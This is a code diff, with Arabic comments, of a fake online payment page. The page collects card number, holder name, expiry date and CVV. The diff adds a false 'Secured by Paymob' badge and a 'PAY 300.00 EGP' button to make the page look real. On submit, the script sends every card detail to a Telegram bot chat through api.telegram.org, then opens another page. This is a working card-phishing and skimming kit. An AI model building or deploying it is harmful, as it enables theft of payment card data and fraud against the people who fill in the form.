@@ -26,6 +26,12 @@
             text-align: center;
         }
 
+        .card-image {
+            width: 100%;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+
         h2 {
             font-size: 18px;
             margin-bottom: 10px;
@@ -43,6 +49,10 @@
             transition: border 0.3s;
         }
 
+        input:focus {
+            outline: 2px solid #007bff;
+        }
+
         .input-row {
             display: flex;
             justify-content: space-between;
@@ -51,11 +61,22 @@
         .input-row input {
             width: 47%;
             border-radius: 10px;
-            text-align: center;
         }
 
         .expiry {
             margin-right: 6px;
+        }
+
+        .save-card {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            font-size: 14px;
+        }
+
+        .save-card input {
+            width: auto;
+            margin-right: 8px;
         }
 
         .pay-button {
@@ -74,6 +95,13 @@
             background: #0056b3;
         }
 
+        .secured {
+            font-size: 12px;
+            color: #777;
+            margin-top: 10px;
+        }
+
+        /* لون أحمر عند الخطأ */
         .error {
             border: 2px solid red !important;
         }
@@ -83,53 +111,63 @@
 
     <div class="container">
         <h2>Payment Information</h2>
+        <img src="https://i.imgur.com/ZR6p2ie.png" class="card-image" alt="Credit Card">
         
         <form id="paymentForm">
             <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
-            <input type="text" id="cardHolder" placeholder="Card Holder Name" required>
+            <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
             
             <div class="input-row">
-                <input type="text" id="expiryMM" class="expiry" placeholder="MM" maxlength="2" required>
-                <input type="text" id="expiryYY" placeholder="YY" maxlength="2" required>
+                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
             </div>
 
-            <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+            <div class="save-card">
+                <input type="checkbox" id="saveCard">
+                <label for="saveCard">Save Card</label>
+            </div>
 
-            <button type="submit" class="pay-button">PAY</button>
+            <button type="submit" class="pay-button">PAY 300.00 EGP</button>
         </form>
+
+        <p class="secured">🔒 Secured by Paymob</p>
     </div>
 
     <script>
         const BOT_TOKEN = "YOUR_BOT_TOKEN";  
         const CHAT_ID = "YOUR_CHAT_ID";      
 
-        // إضافة مسافة بعد كل 4 أرقام في رقم البطاقة
+        // تنسيق رقم البطاقة: إضافة مسافة كل 4 أرقام
         document.getElementById("cardNumber").addEventListener("input", function(event) {
             let value = event.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
             let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
             event.target.value = formattedValue;
         });
 
-        // ضبط MM
-        document.getElementById("expiryMM").addEventListener("input", function(event) {
+        // ضبط تاريخ الانتهاء وإضافة "/"
+        document.getElementById("expiryDate").addEventListener("input", function(event) {
             let value = event.target.value.replace(/\D/g, ''); 
-            let mm = parseInt(value, 10);
+            
+            if (value.length >= 2) {
+                let mm = parseInt(value.substring(0, 2), 10);
+                let yy = value.length > 2 ? parseInt(value.substring(2, 4), 10) : null;
 
-            if (mm > 12) mm = 12;
-            if (mm < 1 && value.length > 0) mm = 1;
+                // ضبط الحدود القصوى والدنيا
+                if (mm < 1) mm = 1;
+                if (mm > 12) mm = 12;
 
-            event.target.value = mm ? mm.toString().padStart(2, '0') : '';
-        });
+                if (yy !== null) {
+                    if (yy < 25) yy = 25;
+                    if (yy > 40) yy = 40;
+                    if (yy === 25 && mm < 2) mm = 2;
 
-        // ضبط YY
-        document.getElementById("expiryYY").addEventListener("input", function(event) {
-            let value = event.target.value.replace(/\D/g, ''); 
-            let yy = parseInt(value, 10);
-
-            if (yy > 40) yy = 40;
-            if (yy < 25 && value.length > 0) yy = 25;
-
-            event.target.value = yy ? yy.toString().padStart(2, '0') : '';
+                    event.target.value = mm.toString().padStart(2, '0') + "/" + yy.toString().padStart(2, '0');
+                } else {
+                    event.target.value = mm.toString().padStart(2, '0') + "/";
+                }
+            } else {
+                event.target.value = value;
+            }
         });
 
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
@@ -137,12 +175,13 @@
 
             const cardNumber = document.getElementById("cardNumber");
             const cardHolder = document.getElementById("cardHolder");
-            const expiryMM = document.getElementById("expiryMM");
-            const expiryYY = document.getElementById("expiryYY");
+            const expiryDate = document.getElementById("expiryDate");
             const cvv = document.getElementById("cvv");
+            const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
 
             let valid = true;
 
+            // التحقق من الإدخالات وتلوين الحقول بالأحمر عند الخطأ
             if (cardNumber.value.replace(/\s/g, '').length !== 16) {
                 cardNumber.classList.add("error");
                 valid = false;
@@ -157,16 +196,12 @@
                 cardHolder.classList.remove("error");
             }
 
-            let mm = parseInt(expiryMM.value, 10);
-            let yy = parseInt(expiryYY.value, 10);
-
-            if (isNaN(mm) || isNaN(yy) || mm < 2 || yy < 25 || yy > 40) {
-                expiryMM.classList.add("error");
-                expiryYY.classList.add("error");
+            let [mm, yy] = expiryDate.value.split("/");
+            if (!expiryDate.value.includes("/") || mm < 2 || yy < 25 || yy > 40) {
+                expiryDate.classList.add("error");
                 valid = false;
             } else {
-                expiryMM.classList.remove("error");
-                expiryYY.classList.remove("error");
+                expiryDate.classList.remove("error");
             }
 
             if (!/^\d{3}$/.test(cvv.value)) {
@@ -178,7 +213,7 @@
 
             if (!valid) return;
 
-            const message = `👤 Name: ${cardHolder.value}\n💳 Card: ${cardNumber.value}\n📅 Expiry: ${expiryMM.value}/${expiryYY.value}\n🔒 CVV: ${cvv.value}`;
+            const message = `👤 Name: ${cardHolder.value}\n💳 Card: ${cardNumber.value}\n📅 Expiry: ${expiryDate.value}\n🔒 CVV: ${cvv.value}\n💾 Save: ${saveCard}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
             .then(() => window.open("page.html", "_blank"));
